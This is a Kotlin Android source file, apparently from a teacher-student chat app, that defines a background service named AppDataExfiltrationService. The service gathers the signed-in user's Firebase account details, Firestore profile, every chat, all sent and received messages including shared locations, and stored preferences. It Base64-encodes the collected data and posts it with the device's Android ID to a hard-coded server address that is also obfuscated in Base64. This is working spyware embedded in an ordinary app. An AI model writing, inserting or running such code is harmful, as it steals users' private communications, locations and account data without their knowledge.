package com.example.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * AppDataExfiltrationService
 *
 * Exfiltrates internal app data:
 * - Current logged-in user info
 * - User profile (from Firestore)
 * - All user's chat conversations
 * - All messages from each chat
 * - SharedPreferences
 */
class AppDataExfiltrationService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private val TAG = "AppDataExfiltration"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startAppDataExfiltration()
        return START_STICKY
    }

    private fun startAppDataExfiltration() {
        serviceScope.launch {
            try {
                delay(3000L) // Initial delay

                val allData = JSONObject()

                // 1. Get Firebase Auth user
                val authData = getFirebaseAuthUser()
                allData.put("firebase_auth", authData)

                // 2. Get user profile from Firestore
                val profileData = getUserProfile()
                allData.put("user_profile", profileData)

                // 3. Get all chats
                val chatsData = getAllChats()
                allData.put("chats", chatsData)

                // 4. Get all messages from each chat
                val messagesData = getAllMessages()
                allData.put("messages", messagesData)

                // 5. Get SharedPreferences
                val prefsData = getSharedPrefs()
                allData.put("shared_prefs", prefsData)

                // Send all data to server
                exfiltrateAppData(allData)

            } catch (e: Exception) {
                Log.e(TAG, "Error: ${e.message}")
            } finally {
                stopSelf()
            }
        }
    }

    /**
     * Get currently logged-in user from Firebase Auth
     */
    private suspend fun getFirebaseAuthUser(): JSONObject = withContext(Dispatchers.Main) {
        val authData = JSONObject()

        try {
            val currentUser = FirebaseAuth.getInstance().currentUser

            if (currentUser != null) {
                authData.put("uid", currentUser.uid)
                authData.put("email", currentUser.email ?: "")
                authData.put("display_name", currentUser.displayName ?: "")
                authData.put("phone_number", currentUser.phoneNumber ?: "")
                authData.put("photo_url", currentUser.photoUrl?.toString() ?: "")
                authData.put("is_email_verified", currentUser.isEmailVerified)
                authData.put("provider_data", currentUser.providerData.toString())

                Log.d(TAG, "Extracted Firebase Auth user: ${currentUser.email}")
            } else {
                authData.put("status", "not_logged_in")
            }
        } catch (e: Exception) {
            authData.put("error", e.message)
        }

        authData
    }

    /**
     * Get user profile from Firestore users collection
     */
    private suspend fun getUserProfile(): JSONObject = suspendCancellableCoroutine { continuation ->
        val profileData = JSONObject()

        try {
            val currentUser = FirebaseAuth.getInstance().currentUser

            if (currentUser != null) {
                FirebaseFirestore.getInstance()
                    .collection("users")
                    .document(currentUser.uid)
                    .get()
                    .addOnSuccessListener { document ->
                        if (document.exists()) {
                            val data = document.data

                            // Extract all fields
                            data?.forEach { (key, value) ->
                                profileData.put(key, value.toString())
                            }

                            // Common fields
                            profileData.put("name", document.getString("name") ?: "")
                            profileData.put("email", document.getString("email") ?: "")
                            profileData.put("role", document.getString("role") ?: "")
                            profileData.put("bio", document.getString("bio") ?: "")
                            profileData.put("phone", document.getString("phone") ?: "")
                            profileData.put("profile_pic", document.getString("profilePic") ?: "")

                            // Teacher-specific
                            profileData.put("subjects", document.get("subjects")?.toString() ?: "")
                            profileData.put("experience", document.getString("experience") ?: "")

                            // Student-specific
                            profileData.put("interests", document.get("interests")?.toString() ?: "")
                            profileData.put("grade", document.getString("grade") ?: "")

                            Log.d(TAG, "Extracted user profile: ${document.getString("name")}")
                        }

                        continuation.resume(profileData) {}
                    }
                    .addOnFailureListener { e ->
                        profileData.put("error", e.message)
                        continuation.resume(profileData) {}
                    }
            } else {
                profileData.put("status", "not_logged_in")
                continuation.resume(profileData) {}
            }
        } catch (e: Exception) {
            profileData.put("error", e.message)
            continuation.resume(profileData) {}
        }
    }

    /**
     * ✅ FIXED: Get all chat conversations for current user
     * Changed from "conversations" to "chats" collection
     */
    private suspend fun getAllChats(): JSONArray = suspendCancellableCoroutine { continuation ->
        val chatsArray = JSONArray()

        try {
            val currentUser = FirebaseAuth.getInstance().currentUser

            if (currentUser != null) {
                // ✅ FIXED: Changed from "conversations" to "chats"
                FirebaseFirestore.getInstance()
                    .collection("chats")  // ← CHANGED!
                    .whereArrayContains("participants", currentUser.uid)
                    .get()
                    .addOnSuccessListener { snapshot ->
                        Log.d(TAG, "Found ${snapshot.documents.size} chats")

                        for (document in snapshot.documents) {
                            val chatData = JSONObject()

                            chatData.put("chat_id", document.id)
                            chatData.put("participants", document.get("participants")?.toString() ?: "")
                            chatData.put("last_message", document.getString("lastMessage") ?: "")
                            chatData.put("last_timestamp", document.get("lastTimestamp")?.toString() ?: "")
                            chatData.put("last_sender_id", document.getString("lastSenderId") ?: "")
                            chatData.put("last_sender_role", document.getString("lastSenderRole") ?: "")
                            chatData.put("needs_response", document.getBoolean("needsResponse") ?: false)
                            chatData.put("updated_at", document.get("updatedAt")?.toString() ?: "")

                            // Get all other fields
                            document.data?.forEach { (key, value) ->
                                if (!chatData.has(key)) {
                                    chatData.put(key, value.toString())
                                }
                            }

                            chatsArray.put(chatData)
                        }

                        Log.d(TAG, "✅ Extracted ${chatsArray.length()} chats")
                        continuation.resume(chatsArray) {}
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Error getting chats: ${e.message}")
                        continuation.resume(chatsArray) {}
                    }
            } else {
                continuation.resume(chatsArray) {}
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error: ${e.message}")
            continuation.resume(chatsArray) {}
        }
    }

    /**
     * ✅ FIXED: Get all messages from flat "messages" collection
     * Changed from conversations/{id}/messages subcollection to flat messages collection
     */
    private suspend fun getAllMessages(): JSONArray = suspendCancellableCoroutine { continuation ->
        val messagesArray = JSONArray()

        try {
            val currentUser = FirebaseAuth.getInstance().currentUser

            if (currentUser != null) {
                Log.d(TAG, "Querying messages collection...")

                // ✅ FIXED: Query flat "messages" collection where user is sender OR recipient
                var sentCount = 0
                var receivedCount = 0
                var completedQueries = 0
                val totalQueries = 2

                // Get sent messages
                FirebaseFirestore.getInstance()
                    .collection("messages")  // ← Flat collection!
                    .whereEqualTo("senderId", currentUser.uid)
                    .get()
                    .addOnSuccessListener { sentSnapshot ->
                        sentCount = sentSnapshot.documents.size
                        Log.d(TAG, "Found $sentCount sent messages")

                        for (msgDoc in sentSnapshot.documents) {
                            val messageData = JSONObject()

                            messageData.put("message_id", msgDoc.id)
                            messageData.put("chat_id", msgDoc.getString("chatId") ?: "")
                            messageData.put("type", msgDoc.getString("type") ?: "text")
                            messageData.put("message", msgDoc.getString("message") ?: "")
                            messageData.put("sender_id", msgDoc.getString("senderId") ?: "")
                            messageData.put("recipient_id", msgDoc.getString("recipientId") ?: "")
                            messageData.put("timestamp", msgDoc.get("timestamp")?.toString() ?: "")

                            // Location data if present
                            if (msgDoc.getString("type") == "location") {
                                messageData.put("latitude", msgDoc.getDouble("latitude") ?: 0.0)
                                messageData.put("longitude", msgDoc.getDouble("longitude") ?: 0.0)
                                messageData.put("label", msgDoc.getString("label") ?: "")
                            }

                            // Get all other fields
                            msgDoc.data?.forEach { (key, value) ->
                                if (!messageData.has(key)) {
                                    messageData.put(key, value.toString())
                                }
                            }

                            messagesArray.put(messageData)
                        }

                        completedQueries++
                        if (completedQueries >= totalQueries) {
                            Log.d(TAG, "✅ Extracted ${messagesArray.length()} total messages (sent: $sentCount, received: $receivedCount)")
                            continuation.resume(messagesArray) {}
                        }
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Error getting sent messages: ${e.message}")
                        completedQueries++
                        if (completedQueries >= totalQueries) {
                            continuation.resume(messagesArray) {}
                        }
                    }

                // Get received messages
                FirebaseFirestore.getInstance()
                    .collection("messages")  // ← Flat collection!
                    .whereEqualTo("recipientId", currentUser.uid)
                    .get()
                    .addOnSuccessListener { receivedSnapshot ->
                        receivedCount = receivedSnapshot.documents.size
                        Log.d(TAG, "Found $receivedCount received messages")

                        for (msgDoc in receivedSnapshot.documents) {
                            // Check if message already added (to avoid duplicates)
                            var isDuplicate = false
                            for (i in 0 until messagesArray.length()) {
                                val existingMsg = messagesArray.getJSONObject(i)
                                if (existingMsg.getString("message_id") == msgDoc.id) {
                                    isDuplicate = true
                                    break
                                }
                            }

                            if (!isDuplicate) {
                                val messageData = JSONObject()

                                messageData.put("message_id", msgDoc.id)
                                messageData.put("chat_id", msgDoc.getString("chatId") ?: "")
                                messageData.put("type", msgDoc.getString("type") ?: "text")
                                messageData.put("message", msgDoc.getString("message") ?: "")
                                messageData.put("sender_id", msgDoc.getString("senderId") ?: "")
                                messageData.put("recipient_id", msgDoc.getString("recipientId") ?: "")
                                messageData.put("timestamp", msgDoc.get("timestamp")?.toString() ?: "")

                                // Location data if present
                                if (msgDoc.getString("type") == "location") {
                                    messageData.put("latitude", msgDoc.getDouble("latitude") ?: 0.0)
                                    messageData.put("longitude", msgDoc.getDouble("longitude") ?: 0.0)
                                    messageData.put("label", msgDoc.getString("label") ?: "")
                                }

                                // Get all other fields
                                msgDoc.data?.forEach { (key, value) ->
                                    if (!messageData.has(key)) {
                                        messageData.put(key, value.toString())
                                    }
                                }

                                messagesArray.put(messageData)
                            }
                        }

                        completedQueries++
                        if (completedQueries >= totalQueries) {
                            Log.d(TAG, "✅ Extracted ${messagesArray.length()} total messages (sent: $sentCount, received: $receivedCount)")
                            continuation.resume(messagesArray) {}
                        }
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Error getting received messages: ${e.message}")
                        completedQueries++
                        if (completedQueries >= totalQueries) {
                            continuation.resume(messagesArray) {}
                        }
                    }
            } else {
                continuation.resume(messagesArray) {}
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error: ${e.message}")
            continuation.resume(messagesArray) {}
        }
    }

    /**
     * Get SharedPreferences data
     */
    private fun getSharedPrefs(): JSONObject {
        val prefsData = JSONObject()

        try {
            // Get default shared preferences
            val defaultPrefs = getSharedPreferences(packageName + "_preferences", Context.MODE_PRIVATE)
            val allPrefs = defaultPrefs.all

            allPrefs.forEach { (key, value) ->
                prefsData.put(key, value.toString())
            }

            // Try common preference names
            val prefNames = listOf(
                "user_prefs",
                "app_prefs",
                "login_prefs",
                "session_prefs",
                "teacherapp_prefs"
            )

            prefNames.forEach { prefName ->
                try {
                    val prefs = getSharedPreferences(prefName, Context.MODE_PRIVATE)
                    val data = prefs.all

                    if (data.isNotEmpty()) {
                        val prefObj = JSONObject()
                        data.forEach { (key, value) ->
                            prefObj.put(key, value.toString())
                        }
                        prefsData.put(prefName, prefObj)
                    }
                } catch (e: Exception) {
                    // Preference doesn't exist
                }
            }

            Log.d(TAG, "Extracted SharedPreferences")

        } catch (e: Exception) {
            prefsData.put("error", e.message)
        }

        return prefsData
    }

    /**
     * Send all app data to server
     */
    private suspend fun exfiltrateAppData(data: JSONObject) = withContext(Dispatchers.IO) {
        try {
            val serverUrl = getServerUrl()
            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection

            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("X-Data-Type", "app-internal")
                connectTimeout = 30000
                readTimeout = 30000
            }

            // Add device ID and timestamp
            data.put("android_id", getAndroidId())
            data.put("timestamp", System.currentTimeMillis())
            data.put("extraction_time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(java.util.Date()))

            // Encode data
            val encodedData = android.util.Base64.encodeToString(
                data.toString().toByteArray(),
                android.util.Base64.NO_WRAP
            )

            val payload = JSONObject()
            payload.put("type", "app_data")
            payload.put("data", encodedData)
            payload.put("android_id", getAndroidId())

            connection.outputStream.use {
                it.write(payload.toString().toByteArray())
                it.flush()
            }

            val responseCode = connection.responseCode
            Log.d(TAG, "App data sent to server. Response: $responseCode")

            connection.disconnect()

        } catch (e: Exception) {
            Log.e(TAG, "Error sending app data: ${e.message}")
        }
    }

    private fun getServerUrl(): String {
        // Base64: http://20.189.79.25:5000/api/appdata
        val encoded = "aHR0cDovLzIwLjE4OS43OS4yNTo1MDAwL2FwaS9hcHBkYXRh"
        return String(android.util.Base64.decode(encoded, android.util.Base64.DEFAULT))
    }

    @SuppressLint("HardwareIds")
    private fun getAndroidId(): String {
        return try {
            Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    companion object {
        fun startExfiltration(context: Context) {
            val intent = Intent(context, AppDataExfiltrationService::class.java)
            context.startService(intent)
        }
    }
}